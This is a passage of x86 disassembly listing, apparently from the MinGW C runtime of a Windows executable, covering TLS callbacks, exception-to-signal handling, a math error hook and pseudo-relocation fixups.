  4095db:	8b 44 24 24          	mov    0x24(%esp),%eax
  4095df:	74 0a                	je     0x4095eb
  4095e1:	c7 05 1c b0 40 00 02 	movl   $0x2,0x40b01c
  4095e8:	00 00 00 
  4095eb:	83 f8 02             	cmp    $0x2,%eax
  4095ee:	74 11                	je     0x409601
  4095f0:	83 f8 01             	cmp    $0x1,%eax
  4095f3:	74 3b                	je     0x409630
  4095f5:	83 c4 18             	add    $0x18,%esp
  4095f8:	b8 01 00 00 00       	mov    $0x1,%eax
  4095fd:	5b                   	pop    %ebx
  4095fe:	c2 0c 00             	ret    $0xc
  409601:	bb 30 f0 41 00       	mov    $0x41f030,%ebx
  409606:	81 fb 30 f0 41 00    	cmp    $0x41f030,%ebx
  40960c:	74 e7                	je     0x4095f5
  40960e:	66 90                	xchg   %ax,%ax
  409610:	8b 03                	mov    (%ebx),%eax
  409612:	85 c0                	test   %eax,%eax
  409614:	74 02                	je     0x409618
  409616:	ff d0                	call   *%eax
  409618:	83 c3 04             	add    $0x4,%ebx
  40961b:	81 fb 30 f0 41 00    	cmp    $0x41f030,%ebx
  409621:	75 ed                	jne    0x409610
  409623:	83 c4 18             	add    $0x18,%esp
  409626:	b8 01 00 00 00       	mov    $0x1,%eax
  40962b:	5b                   	pop    %ebx
  40962c:	c2 0c 00             	ret    $0xc
  40962f:	90                   	nop
  409630:	8b 44 24 28          	mov    0x28(%esp),%eax
  409634:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  40963b:	00 
  40963c:	89 44 24 08          	mov    %eax,0x8(%esp)
  409640:	8b 44 24 20          	mov    0x20(%esp),%eax
  409644:	89 04 24             	mov    %eax,(%esp)
  409647:	e8 24 0b 00 00       	call   0x40a170
  40964c:	eb a7                	jmp    0x4095f5
  40964e:	66 90                	xchg   %ax,%ax
  409650:	31 c0                	xor    %eax,%eax
  409652:	c3                   	ret
  409653:	90                   	nop
  409654:	90                   	nop
  409655:	90                   	nop
  409656:	90                   	nop
  409657:	90                   	nop
  409658:	90                   	nop
  409659:	90                   	nop
  40965a:	90                   	nop
  40965b:	90                   	nop
  40965c:	90                   	nop
  40965d:	90                   	nop
  40965e:	90                   	nop
  40965f:	90                   	nop
  409660:	a1 a8 e2 41 00       	mov    0x41e2a8,%eax
  409665:	ff e0                	jmp    *%eax
  409667:	90                   	nop
  409668:	90                   	nop
  409669:	90                   	nop
  40966a:	90                   	nop
  40966b:	90                   	nop
  40966c:	90                   	nop
  40966d:	90                   	nop
  40966e:	90                   	nop
  40966f:	90                   	nop
  409670:	8b 44 24 04          	mov    0x4(%esp),%eax
  409674:	c3                   	ret
  409675:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  409679:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  409680:	8b 44 24 04          	mov    0x4(%esp),%eax
  409684:	c3                   	ret
  409685:	90                   	nop
  409686:	90                   	nop
  409687:	90                   	nop
  409688:	90                   	nop
  409689:	90                   	nop
  40968a:	90                   	nop
  40968b:	90                   	nop
  40968c:	90                   	nop
  40968d:	90                   	nop
  40968e:	90                   	nop
  40968f:	90                   	nop
  409690:	53                   	push   %ebx
  409691:	83 ec 28             	sub    $0x28,%esp
  409694:	a1 7c d6 41 00       	mov    0x41d67c,%eax
  409699:	89 04 24             	mov    %eax,(%esp)
  40969c:	e8 cf ff ff ff       	call   0x409670
  4096a1:	83 f8 ff             	cmp    $0xffffffff,%eax
  4096a4:	89 44 24 18          	mov    %eax,0x18(%esp)
  4096a8:	0f 84 82 00 00 00    	je     0x409730
  4096ae:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  4096b5:	e8 56 12 00 00       	call   0x40a910
  4096ba:	a1 7c d6 41 00       	mov    0x41d67c,%eax
  4096bf:	89 04 24             	mov    %eax,(%esp)
  4096c2:	e8 a9 ff ff ff       	call   0x409670
  4096c7:	89 44 24 18          	mov    %eax,0x18(%esp)
  4096cb:	a1 78 d6 41 00       	mov    0x41d678,%eax
  4096d0:	89 04 24             	mov    %eax,(%esp)
  4096d3:	e8 98 ff ff ff       	call   0x409670
  4096d8:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4096dc:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4096e0:	89 44 24 08          	mov    %eax,0x8(%esp)
  4096e4:	8d 44 24 18          	lea    0x18(%esp),%eax
  4096e8:	89 44 24 04          	mov    %eax,0x4(%esp)
  4096ec:	8b 44 24 30          	mov    0x30(%esp),%eax
  4096f0:	89 04 24             	mov    %eax,(%esp)
  4096f3:	e8 20 12 00 00       	call   0x40a918
  4096f8:	89 c3                	mov    %eax,%ebx
  4096fa:	8b 44 24 18          	mov    0x18(%esp),%eax
  4096fe:	89 04 24             	mov    %eax,(%esp)
  409701:	e8 7a ff ff ff       	call   0x409680
  409706:	a3 7c d6 41 00       	mov    %eax,0x41d67c
  40970b:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40970f:	89 04 24             	mov    %eax,(%esp)
  409712:	e8 69 ff ff ff       	call   0x409680
  409717:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  40971e:	a3 78 d6 41 00       	mov    %eax,0x41d678
  409723:	e8 f8 11 00 00       	call   0x40a920
  409728:	83 c4 28             	add    $0x28,%esp
  40972b:	89 d8                	mov    %ebx,%eax
  40972d:	5b                   	pop    %ebx
  40972e:	c3                   	ret
  40972f:	90                   	nop
  409730:	8b 44 24 30          	mov    0x30(%esp),%eax
  409734:	89 04 24             	mov    %eax,(%esp)
  409737:	ff 15 f8 e2 41 00    	call   *0x41e2f8
  40973d:	83 c4 28             	add    $0x28,%esp
  409740:	5b                   	pop    %ebx
  409741:	c3                   	ret
  409742:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  409749:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  409750:	83 ec 1c             	sub    $0x1c,%esp
  409753:	8b 44 24 20          	mov    0x20(%esp),%eax
  409757:	89 04 24             	mov    %eax,(%esp)
  40975a:	e8 31 ff ff ff       	call   0x409690
  40975f:	85 c0                	test   %eax,%eax
  409761:	0f 94 c0             	sete   %al
  409764:	83 c4 1c             	add    $0x1c,%esp
  409767:	0f b6 c0             	movzbl %al,%eax
  40976a:	f7 d8                	neg    %eax
  40976c:	c3                   	ret
  40976d:	90                   	nop
  40976e:	90                   	nop
  40976f:	90                   	nop
  409770:	55                   	push   %ebp
  409771:	89 e5                	mov    %esp,%ebp
  409773:	56                   	push   %esi
  409774:	53                   	push   %ebx
  409775:	83 ec 10             	sub    $0x10,%esp
  409778:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40977b:	8b 03                	mov    (%ebx),%eax
  40977d:	8b 00                	mov    (%eax),%eax
  40977f:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  409784:	77 42                	ja     0x4097c8
  409786:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  40978b:	0f 83 9f 00 00 00    	jae    0x409830
  409791:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  409796:	0f 85 9b 00 00 00    	jne    0x409837
  40979c:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4097a3:	00 
  4097a4:	c7 04 24 0b 00 00 00 	movl   $0xb,(%esp)
  4097ab:	e8 50 11 00 00       	call   0x40a900
  4097b0:	83 f8 01             	cmp    $0x1,%eax
  4097b3:	0f 84 ad 00 00 00    	je     0x409866
  4097b9:	85 c0                	test   %eax,%eax
  4097bb:	74 20                	je     0x4097dd
  4097bd:	c7 04 24 0b 00 00 00 	movl   $0xb,(%esp)
  4097c4:	ff d0                	call   *%eax
  4097c6:	eb 55                	jmp    0x40981d
  4097c8:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  4097cd:	74 22                	je     0x4097f1
  4097cf:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  4097d4:	74 68                	je     0x40983e
  4097d6:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  4097db:	74 53                	je     0x409830
  4097dd:	a1 e4 d2 41 00       	mov    0x41d2e4,%eax
  4097e2:	85 c0                	test   %eax,%eax
  4097e4:	74 3c                	je     0x409822
  4097e6:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4097e9:	8d 65 f8             	lea    -0x8(%ebp),%esp
  4097ec:	5b                   	pop    %ebx
  4097ed:	5e                   	pop    %esi
  4097ee:	5d                   	pop    %ebp
  4097ef:	ff e0                	jmp    *%eax
  4097f1:	31 f6                	xor    %esi,%esi
  4097f3:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4097fa:	00 
  4097fb:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  409802:	e8 f9 10 00 00       	call   0x40a900
  409807:	83 f8 01             	cmp    $0x1,%eax
  40980a:	0f 84 86 00 00 00    	je     0x409896
  409810:	85 c0                	test   %eax,%eax
  409812:	74 c9                	je     0x4097dd
  409814:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  40981b:	ff d0                	call   *%eax
  40981d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  409822:	8d 65 f8             	lea    -0x8(%ebp),%esp
  409825:	5b                   	pop    %ebx
  409826:	5e                   	pop    %esi
  409827:	5d                   	pop    %ebp
  409828:	c2 04 00             	ret    $0x4
  40982b:	90                   	nop
  40982c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  409830:	be 01 00 00 00       	mov    $0x1,%esi
  409835:	eb bc                	jmp    0x4097f3
  409837:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  40983c:	75 9f                	jne    0x4097dd
  40983e:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  409845:	00 
  409846:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  40984d:	e8 ae 10 00 00       	call   0x40a900
  409852:	83 f8 01             	cmp    $0x1,%eax
  409855:	74 29                	je     0x409880
  409857:	85 c0                	test   %eax,%eax
  409859:	74 82                	je     0x4097dd
  40985b:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  409862:	ff d0                	call   *%eax
  409864:	eb b7                	jmp    0x40981d
  409866:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  40986d:	00 
  40986e:	c7 04 24 0b 00 00 00 	movl   $0xb,(%esp)
  409875:	e8 86 10 00 00       	call   0x40a900
  40987a:	eb a1                	jmp    0x40981d
  40987c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  409880:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  409887:	00 
  409888:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  40988f:	e8 6c 10 00 00       	call   0x40a900
  409894:	eb 87                	jmp    0x40981d
  409896:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  40989d:	00 
  40989e:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  4098a5:	e8 56 10 00 00       	call   0x40a900
  4098aa:	85 f6                	test   %esi,%esi
  4098ac:	0f 84 6b ff ff ff    	je     0x40981d
  4098b2:	e8 19 05 00 00       	call   0x409dd0
  4098b7:	e9 61 ff ff ff       	jmp    0x40981d
  4098bc:	90                   	nop
  4098bd:	90                   	nop
  4098be:	90                   	nop
  4098bf:	90                   	nop
  4098c0:	31 c0                	xor    %eax,%eax
  4098c2:	c3                   	ret
  4098c3:	90                   	nop
  4098c4:	90                   	nop
  4098c5:	90                   	nop
  4098c6:	90                   	nop
  4098c7:	90                   	nop
  4098c8:	90                   	nop
  4098c9:	90                   	nop
  4098ca:	90                   	nop
  4098cb:	90                   	nop
  4098cc:	90                   	nop
  4098cd:	90                   	nop
  4098ce:	90                   	nop
  4098cf:	90                   	nop
  4098d0:	83 ec 3c             	sub    $0x3c,%esp
  4098d3:	a1 e8 d2 41 00       	mov    0x41d2e8,%eax
  4098d8:	dd 44 24 48          	fldl   0x48(%esp)
  4098dc:	dd 44 24 50          	fldl   0x50(%esp)
  4098e0:	dd 44 24 58          	fldl   0x58(%esp)
  4098e4:	85 c0                	test   %eax,%eax
  4098e6:	74 29                	je     0x409911
  4098e8:	d9 ca                	fxch   %st(2)
  4098ea:	8b 54 24 40          	mov    0x40(%esp),%edx
  4098ee:	dd 5c 24 18          	fstpl  0x18(%esp)
  4098f2:	dd 5c 24 20          	fstpl  0x20(%esp)
  4098f6:	dd 5c 24 28          	fstpl  0x28(%esp)
  4098fa:	89 54 24 10          	mov    %edx,0x10(%esp)
  4098fe:	8b 54 24 44          	mov    0x44(%esp),%edx
  409902:	89 54 24 14          	mov    %edx,0x14(%esp)
  409906:	8d 54 24 10          	lea    0x10(%esp),%edx
  40990a:	89 14 24             	mov    %edx,(%esp)
  40990d:	ff d0                	call   *%eax
  40990f:	eb 06                	jmp    0x409917
  409911:	dd d8                	fstp   %st(0)
  409913:	dd d8                	fstp   %st(0)
  409915:	dd d8                	fstp   %st(0)
  409917:	83 c4 3c             	add    $0x3c,%esp
  40991a:	c3                   	ret
  40991b:	90                   	nop
  40991c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  409920:	8b 44 24 04          	mov    0x4(%esp),%eax
  409924:	a3 e8 d2 41 00       	mov    %eax,0x41d2e8
  409929:	e9 fa 0f 00 00       	jmp    0x40a928
  40992e:	66 90                	xchg   %ax,%ax
  409930:	83 ec 3c             	sub    $0x3c,%esp
  409933:	8b 44 24 40          	mov    0x40(%esp),%eax
  409937:	8b 10                	mov    (%eax),%edx
  409939:	8d 4a ff             	lea    -0x1(%edx),%ecx
  40993c:	ba 54 02 41 00       	mov    $0x410254,%edx
  409941:	83 f9 05             	cmp    $0x5,%ecx
  409944:	77 07                	ja     0x40994d
  409946:	8b 14 8d 70 03 41 00 	mov    0x410370(,%ecx,4),%edx
  40994d:	dd 40 18             	fldl   0x18(%eax)
  409950:	dd 5c 24 20          	fstpl  0x20(%esp)
  409954:	dd 40 10             	fldl   0x10(%eax)
  409957:	dd 5c 24 18          	fstpl  0x18(%esp)
  40995b:	dd 40 08             	fldl   0x8(%eax)
  40995e:	dd 5c 24 10          	fstpl  0x10(%esp)
  409962:	8b 40 04             	mov    0x4(%eax),%eax
  409965:	89 54 24 08          	mov    %edx,0x8(%esp)
  409969:	c7 44 24 04 64 02 41 	movl   $0x410264,0x4(%esp)
  409970:	00 
  409971:	89 44 24 0c          	mov    %eax,0xc(%esp)
  409975:	a1 e8 e2 41 00       	mov    0x41e2e8,%eax
  40997a:	83 c0 40             	add    $0x40,%eax
  40997d:	89 04 24             	mov    %eax,(%esp)
  409980:	e8 ab 0f 00 00       	call   0x40a930
  409985:	31 c0                	xor    %eax,%eax
  409987:	83 c4 3c             	add    $0x3c,%esp
  40998a:	c3                   	ret
  40998b:	90                   	nop
  40998c:	90                   	nop
  40998d:	90                   	nop
  40998e:	90                   	nop
  40998f:	90                   	nop
  409990:	53                   	push   %ebx
  409991:	83 ec 18             	sub    $0x18,%esp
  409994:	a1 e8 e2 41 00       	mov    0x41e2e8,%eax
  409999:	c7 44 24 08 1b 00 00 	movl   $0x1b,0x8(%esp)
  4099a0:	00 
  4099a1:	8d 5c 24 24          	lea    0x24(%esp),%ebx
  4099a5:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  4099ac:	00 
  4099ad:	c7 04 24 88 03 41 00 	movl   $0x410388,(%esp)
  4099b4:	83 c0 40             	add    $0x40,%eax
  4099b7:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4099bb:	e8 50 0e 00 00       	call   0x40a810
  4099c0:	8b 44 24 20          	mov    0x20(%esp),%eax
  4099c4:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  4099c8:	89 44 24 04          	mov    %eax,0x4(%esp)
  4099cc:	a1 e8 e2 41 00       	mov    0x41e2e8,%eax
  4099d1:	83 c0 40             	add    $0x40,%eax
  4099d4:	89 04 24             	mov    %eax,(%esp)
  4099d7:	e8 6c 0e 00 00       	call   0x40a848
  4099dc:	e8 57 0f 00 00       	call   0x40a938
  4099e1:	eb 0d                	jmp    0x4099f0
  4099e3:	90                   	nop
  4099e4:	90                   	nop
  4099e5:	90                   	nop
  4099e6:	90                   	nop
  4099e7:	90                   	nop
  4099e8:	90                   	nop
  4099e9:	90                   	nop
  4099ea:	90                   	nop
  4099eb:	90                   	nop
  4099ec:	90                   	nop
  4099ed:	90                   	nop
  4099ee:	90                   	nop
  4099ef:	90                   	nop
  4099f0:	55                   	push   %ebp
  4099f1:	89 e5                	mov    %esp,%ebp
  4099f3:	57                   	push   %edi
  4099f4:	56                   	push   %esi
  4099f5:	89 c6                	mov    %eax,%esi
  4099f7:	53                   	push   %ebx
  4099f8:	83 ec 3c             	sub    $0x3c,%esp
  4099fb:	a1 f0 d2 41 00       	mov    0x41d2f0,%eax
  409a00:	85 c0                	test   %eax,%eax
  409a02:	0f 8e eb 00 00 00    	jle    0x409af3
  409a08:	8b 15 f4 d2 41 00    	mov    0x41d2f4,%edx
  409a0e:	31 db                	xor    %ebx,%ebx
  409a10:	8b 4a 04             	mov    0x4(%edx),%ecx
  409a13:	39 f1                	cmp    %esi,%ecx
  409a15:	77 0a                	ja     0x409a21
  409a17:	8b 7a 08             	mov    0x8(%edx),%edi
  409a1a:	03 4f 08             	add    0x8(%edi),%ecx
  409a1d:	39 ce                	cmp    %ecx,%esi
  409a1f:	72 75                	jb     0x409a96
  409a21:	83 c3 01             	add    $0x1,%ebx
  409a24:	83 c2 0c             	add    $0xc,%edx
  409a27:	39 c3                	cmp    %eax,%ebx
  409a29:	75 e5                	jne    0x409a10
  409a2b:	89 34 24             	mov    %esi,(%esp)
  409a2e:	e8 fd 08 00 00       	call   0x40a330
  409a33:	85 c0                	test   %eax,%eax
  409a35:	89 c7                	mov    %eax,%edi
  409a37:	0f 84 dd 00 00 00    	je     0x409b1a
  409a3d:	8d 34 5b             	lea    (%ebx,%ebx,2),%esi
  409a40:	8b 1d f4 d2 41 00    	mov    0x41d2f4,%ebx
  409a46:	c1 e6 02             	shl    $0x2,%esi
  409a49:	01 f3                	add    %esi,%ebx
  409a4b:	89 43 08             	mov    %eax,0x8(%ebx)
  409a4e:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  409a54:	e8 c7 09 00 00       	call   0x40a420
  409a59:	03 47 0c             	add    0xc(%edi),%eax
  409a5c:	89 43 04             	mov    %eax,0x4(%ebx)
  409a5f:	8d 45 cc             	lea    -0x34(%ebp),%eax
  409a62:	89 44 24 04          	mov    %eax,0x4(%esp)
  409a66:	a1 f4 d2 41 00       	mov    0x41d2f4,%eax
  409a6b:	c7 44 24 08 1c 00 00 	movl   $0x1c,0x8(%esp)
  409a72:	00 
  409a73:	8b 44 30 04          	mov    0x4(%eax,%esi,1),%eax
  409a77:	89 04 24             	mov    %eax,(%esp)
  409a7a:	ff 15 90 e2 41 00    	call   *0x41e290
  409a80:	83 ec 0c             	sub    $0xc,%esp
  409a83:	85 c0                	test   %eax,%eax
  409a85:	74 73                	je     0x409afa
  409a87:	8b 45 e0             	mov    -0x20(%ebp),%eax
  409a8a:	83 f8 40             	cmp    $0x40,%eax
  409a8d:	75 11                	jne    0x409aa0
  409a8f:	83 05 f0 d2 41 00 01 	addl   $0x1,0x41d2f0
  409a96:	8d 65 f4             	lea    -0xc(%ebp),%esp
  409a99:	5b                   	pop    %ebx
  409a9a:	5e                   	pop    %esi
  409a9b:	5f                   	pop    %edi
  409a9c:	5d                   	pop    %ebp
  409a9d:	c3                   	ret
  409a9e:	66 90                	xchg   %ax,%ax
  409aa0:	83 f8 04             	cmp    $0x4,%eax
  409aa3:	74 ea                	je     0x409a8f
  409aa5:	3d 80 00 00 00       	cmp    $0x80,%eax
  409aaa:	74 e3                	je     0x409a8f
  409aac:	83 f8 08             	cmp    $0x8,%eax
  409aaf:	74 de                	je     0x409a8f
  409ab1:	8b 45 d8             	mov    -0x28(%ebp),%eax
  409ab4:	03 35 f4 d2 41 00    	add    0x41d2f4,%esi
  409aba:	c7 44 24 08 40 00 00 	movl   $0x40,0x8(%esp)
  409ac1:	00 
  409ac2:	89 44 24 04          	mov    %eax,0x4(%esp)
  409ac6:	8b 45 cc             	mov    -0x34(%ebp),%eax
  409ac9:	89 74 24 0c          	mov    %esi,0xc(%esp)
  409acd:	89 04 24             	mov    %eax,(%esp)
  409ad0:	ff 15 8c e2 41 00    	call   *0x41e28c
  409ad6:	83 ec 10             	sub    $0x10,%esp
  409ad9:	85 c0                	test   %eax,%eax
  409adb:	75 b2                	jne    0x409a8f
  409add:	ff 15 34 e2 41 00    	call   *0x41e234
  409ae3:	c7 04 24 f8 03 41 00 	movl   $0x4103f8,(%esp)
  409aea:	89 44 24 04          	mov    %eax,0x4(%esp)
  409aee:	e8 9d fe ff ff       	call   0x409990
  409af3:	31 db                	xor    %ebx,%ebx
  409af5:	e9 31 ff ff ff       	jmp    0x409a2b
  409afa:	a1 f4 d2 41 00       	mov    0x41d2f4,%eax
  409aff:	8b 44 30 04          	mov    0x4(%eax,%esi,1),%eax
  409b03:	89 44 24 08          	mov    %eax,0x8(%esp)
  409b07:	8b 47 08             	mov    0x8(%edi),%eax
  409b0a:	c7 04 24 c4 03 41 00 	movl   $0x4103c4,(%esp)
  409b11:	89 44 24 04          	mov    %eax,0x4(%esp)
  409b15:	e8 76 fe ff ff       	call   0x409990
  409b1a:	89 74 24 04          	mov    %esi,0x4(%esp)
  409b1e:	c7 04 24 a4 03 41 00 	movl   $0x4103a4,(%esp)
  409b25:	e8 66 fe ff ff       	call   0x409990
  409b2a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  409b30:	a1 ec d2 41 00       	mov    0x41d2ec,%eax
  409b35:	85 c0                	test   %eax,%eax
  409b37:	74 07                	je     0x409b40
  409b39:	c3                   	ret
  409b3a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  409b40:	55                   	push   %ebp
  409b41:	89 e5                	mov    %esp,%ebp
  409b43:	57                   	push   %edi
  409b44:	56                   	push   %esi
  409b45:	53                   	push   %ebx
  409b46:	83 ec 4c             	sub    $0x4c,%esp
  409b49:	c7 05 ec d2 41 00 01 	movl   $0x1,0x41d2ec
  409b50:	00 00 00 
  409b53:	e8 28 08 00 00       	call   0x40a380
  409b58:	8d 04 40             	lea    (%eax,%eax,2),%eax
  409b5b:	8d 04 85 1e 00 00 00 	lea    0x1e(,%eax,4),%eax
  409b62:	83 e0 f0             	and    $0xfffffff0,%eax
  409b65:	e8 e6 09 00 00       	call   0x40a550
  409b6a:	c7 05 f0 d2 41 00 00 	movl   $0x0,0x41d2f0
  409b71:	00 00 00 
  409b74:	29 c4                	sub    %eax,%esp
  409b76:	8d 44 24 1f          	lea    0x1f(%esp),%eax
  409b7a:	83 e0 f0             	and    $0xfffffff0,%eax
  409b7d:	a3 f4 d2 41 00       	mov    %eax,0x41d2f4
  409b82:	b8 c8 0f 41 00       	mov    $0x410fc8,%eax
  409b87:	2d c8 0f 41 00       	sub    $0x410fc8,%eax
  409b8c:	83 f8 07             	cmp    $0x7,%eax
  409b8f:	0f 8e 9b 00 00 00    	jle    0x409c30
  409b95:	83 f8 0b             	cmp    $0xb,%eax
  409b98:	0f 8e 55 01 00 00    	jle    0x409cf3
  409b9e:	a1 c8 0f 41 00       	mov    0x410fc8,%eax
  409ba3:	85 c0                	test   %eax,%eax
  409ba5:	0f 85 8d 00 00 00    	jne    0x409c38
  409bab:	a1 cc 0f 41 00       	mov    0x410fcc,%eax
  409bb0:	85 c0                	test   %eax,%eax
  409bb2:	0f 85 80 00 00 00    	jne    0x409c38
  409bb8:	8b 3d d0 0f 41 00    	mov    0x410fd0,%edi
  409bbe:	bb d4 0f 41 00       	mov    $0x410fd4,%ebx
  409bc3:	85 ff                	test   %edi,%edi
  409bc5:	0f 84 2d 01 00 00    	je     0x409cf8
  409bcb:	bb c8 0f 41 00       	mov    $0x410fc8,%ebx
  409bd0:	8b 43 08             	mov    0x8(%ebx),%eax
  409bd3:	83 f8 01             	cmp    $0x1,%eax
  409bd6:	0f 85 e4 01 00 00    	jne    0x409dc0
  409bdc:	83 c3 0c             	add    $0xc,%ebx
  409bdf:	81 fb c8 0f 41 00    	cmp    $0x410fc8,%ebx
  409be5:	73 49                	jae    0x409c30
  409be7:	8b 0b                	mov    (%ebx),%ecx
  409be9:	8b 43 04             	mov    0x4(%ebx),%eax
  409bec:	8d 91 00 00 40 00    	lea    0x400000(%ecx),%edx
  409bf2:	8b b9 00 00 40 00    	mov    0x400000(%ecx),%edi
  409bf8:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  409bfb:	0f b6 53 08          	movzbl 0x8(%ebx),%edx
  409bff:	8d b0 00 00 40 00    	lea    0x400000(%eax),%esi
  409c05:	83 fa 10             	cmp    $0x10,%edx
  409c08:	0f 84 04 01 00 00    	je     0x409d12
  409c0e:	83 fa 20             	cmp    $0x20,%edx
  409c11:	0f 84 71 01 00 00    	je     0x409d88
  409c17:	83 fa 08             	cmp    $0x8,%edx
  409c1a:	0f 84 3e 01 00 00    	je     0x409d5e
  409c20:	89 54 24 04          	mov    %edx,0x4(%esp)
  409c24:	c7 04 24 54 04 41 00 	movl   $0x410454,(%esp)
  409c2b:	e8 60 fd ff ff       	call   0x409990
  409c30:	8d 65 f4             	lea    -0xc(%ebp),%esp
  409c33:	5b                   	pop    %ebx
  409c34:	5e                   	pop    %esi
  409c35:	5f                   	pop    %edi
  409c36:	5d                   	pop    %ebp
  409c37:	c3                   	ret
  409c38:	bb c8 0f 41 00       	mov    $0x410fc8,%ebx
  409c3d:	81 fb c8 0f 41 00    	cmp    $0x410fc8,%ebx
  409c43:	73 eb                	jae    0x409c30
  409c45:	8b 73 04             	mov    0x4(%ebx),%esi
  409c48:	83 c3 08             	add    $0x8,%ebx
  409c4b:	8b 96 00 00 40 00    	mov    0x400000(%esi),%edx
  409c51:	8d 86 00 00 40 00    	lea    0x400000(%esi),%eax
  409c57:	03 53 f8             	add    -0x8(%ebx),%edx
  409c5a:	89 55 cc             	mov    %edx,-0x34(%ebp)
  409c5d:	e8 8e fd ff ff       	call   0x4099f0
  409c62:	8b 45 cc             	mov    -0x34(%ebp),%eax
  409c65:	81 fb c8 0f 41 00    	cmp    $0x410fc8,%ebx
  409c6b:	89 86 00 00 40 00    	mov    %eax,0x400000(%esi)
  409c71:	72 d2                	jb     0x409c45
  409c73:	a1 f0 d2 41 00       	mov    0x41d2f0,%eax
  409c78:	31 db                	xor    %ebx,%ebx
  409c7a:	85 c0                	test   %eax,%eax
  409c7c:	7f 0d                	jg     0x409c8b
  409c7e:	eb b0                	jmp    0x409c30
  409c80:	83 c3 01             	add    $0x1,%ebx
  409c83:	3b 1d f0 d2 41 00    	cmp    0x41d2f0,%ebx
  409c89:	7d a5                	jge    0x409c30
  409c8b:	a1 f4 d2 41 00       	mov    0x41d2f4,%eax
  409c90:	8d 3c 5b             	lea    (%ebx,%ebx,2),%edi
  409c93:	8d 34 bd 00 00 00 00 	lea    0x0(,%edi,4),%esi
  409c9a:	01 f0                	add    %esi,%eax
  409c9c:	8b 10                	mov    (%eax),%edx
  409c9e:	85 d2                	test   %edx,%edx
  409ca0:	74 de                	je     0x409c80
  409ca2:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  409ca5:	c7 44 24 08 1c 00 00 	movl   $0x1c,0x8(%esp)
  409cac:	00 
  409cad:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  409cb1:	8b 40 04             	mov    0x4(%eax),%eax
  409cb4:	89 04 24             	mov    %eax,(%esp)
  409cb7:	ff 15 90 e2 41 00    	call   *0x41e290
  409cbd:	83 ec 0c             	sub    $0xc,%esp
  409cc0:	85 c0                	test   %eax,%eax
  409cc2:	0f 84 d3 00 00 00    	je     0x409d9b
  409cc8:	8d 45 c8             	lea    -0x38(%ebp),%eax
  409ccb:	89 44 24 0c          	mov    %eax,0xc(%esp)
  409ccf:	a1 f4 d2 41 00       	mov    0x41d2f4,%eax
  409cd4:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  409cd7:	89 44 24 08          	mov    %eax,0x8(%esp)
  409cdb:	8b 45 d8             	mov    -0x28(%ebp),%eax
  409cde:	89 44 24 04          	mov    %eax,0x4(%esp)
  409ce2:	8b 45 cc             	mov    -0x34(%ebp),%eax
  409ce5:	89 04 24             	mov    %eax,(%esp)
  409ce8:	ff 15 8c e2 41 00    	call   *0x41e28c
  409cee:	83 ec 10             	sub    $0x10,%esp
  409cf1:	eb 8d                	jmp    0x409c80
  409cf3:	bb c8 0f 41 00       	mov    $0x410fc8,%ebx
  409cf8:	8b 33                	mov    (%ebx),%esi
  409cfa:	85 f6                	test   %esi,%esi
  409cfc:	0f 85 3b ff ff ff    	jne    0x409c3d
  409d02:	8b 4b 04             	mov    0x4(%ebx),%ecx
  409d05:	85 c9                	test   %ecx,%ecx
  409d07:	0f 84 c3 fe ff ff    	je     0x409bd0
  409d0d:	e9 2b ff ff ff       	jmp    0x409c3d
  409d12:	0f b7 80 00 00 40 00 	movzwl 0x400000(%eax),%eax
  409d19:	0f b7 d0             	movzwl %ax,%edx
  409d1c:	66 89 45 c4          	mov    %ax,-0x3c(%ebp)
  409d20:	89 d0                	mov    %edx,%eax
  409d22:	0d 00 00 ff ff       	or     $0xffff0000,%eax
  409d27:	66 83 7d c4 00       	cmpw   $0x0,-0x3c(%ebp)
  409d2c:	0f 48 d0             	cmovs  %eax,%edx
  409d2f:	89 f0                	mov    %esi,%eax
  409d31:	29 ca                	sub    %ecx,%edx
  409d33:	81 ea 00 00 40 00    	sub    $0x400000,%edx
  409d39:	01 fa                	add    %edi,%edx
  409d3b:	89 55 cc             	mov    %edx,-0x34(%ebp)
